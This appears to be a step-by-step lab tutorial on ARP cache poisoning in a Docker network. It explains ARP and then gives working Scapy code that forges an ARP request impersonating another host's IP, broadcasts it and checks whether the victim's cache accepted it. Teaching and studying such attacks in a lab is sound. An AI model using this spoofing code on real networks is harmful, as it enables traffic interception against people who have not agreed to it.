## Task 1: ARP Cache Poisoning

<details>
  <summary> Why is ARP / ARP Cache? </summary>
              * ARP (Address Resolution Protocol): A networking protocol that allows a computer to discover the MAC address associated with an IP address on the same local network. This helps the computer deliver data to the correct device.

* ARP Cache: A temporary address book stored in each computer's memory that keeps track of IP addresses and their corresponding MAC addresses. This prevents the computer from having to send a new ARP request every time it communicates with the same device.

* In simple terms: ARP finds the MAC address, and the ARP cache remembers it.
</details>

### Examine the Victim's ARP cache
8. Before launching the attack, let's see what the Victim currently knows about User 1. Run:

  ```javascript
  docker exec victim-10.9.0.5 ip neigh
  ```

### Construct the ARP request
11. Open Scapy. Run

  ```javascript
  docker exec -it seed-attacker python3
  ```
  ```javascript
  from scapy.all import ARP, Ether, sendp
  ```

12. Before sending anything, create the ARP packet and inspect its contents.
  ```javascript
  arp = ARP(op=1, psrc="10.9.0.6", hwsrc="02:42:4b:3d:79:e5", pdst="10.9.0.5")
  ```

13. Inspect the content of the ARP packet just created.
    
  ```javascript
  arp.show()
  ```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<img width="865" height="365" alt="image" src="https://github.com/user-attachments/assets/3abacf30-1400-4cab-ac3c-99ff1ebf3986" />


14. The Attacker is falsely claiming to own User 1's IP address (10.9.0.6). We want to see whether the Victim (10.9.0.5) accepts that information and updates its ARP cache. The Attacker is essentially sending this message:

***"Who has IP address 10.9.0.5? I'm 10.9.0.6 (false as this belongs to User 1), and my MAC address is 02:42:4b:3d:79:e5."***


### Prepare the Ethernet frame

15. We're going to place the ARP request inside an Ethernet frame.

<details>
  <summary> Why?</summary>
              ARP messages travel inside Ethernet frames on your local network.
</details>

16. Run:

  ```javascript
  packet = Ether(dst="ff:ff:ff:ff:ff:ff", src="02:42:4b:3d:79:e5") / arp
  ```

### Send the ARP request

17. Have Scapy transmit the ARP request from the Attacker. Run:
  ```javascript
  sendp(packet, iface="br-c84de5716c52", count=1)
  ```

- What does this command do?
       
      - sendp(packet) sends the Ethernet frame we created.
      - iface="br-c84de5716c52" specifies the Docker bridge connected to your lab network.
      - count=1 sends the packet only once.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<img width="612" height="161" alt="image" src="https://github.com/user-attachments/assets/6f68fb74-475f-4c9d-ad9e-c3d8d1536de9" />

18. **What are we expecting?** The Victim may accept the false sender information and update its ARP cache so that User 1's IP (10.9.0.6) points to the Attacker's MAC (02:42:4b:3d:79:e5). However, this is not guaranteed. The Victim's ARP implementation and current cache state can affect the result.

### Check whether the Victim accepted the false information.
19. Check the Victim's ARP cache. Open a new terminal. Run:

  ```javascript
  docker exec victim-10.9.0.5 ip neigh show 10.9.0.6
  ```
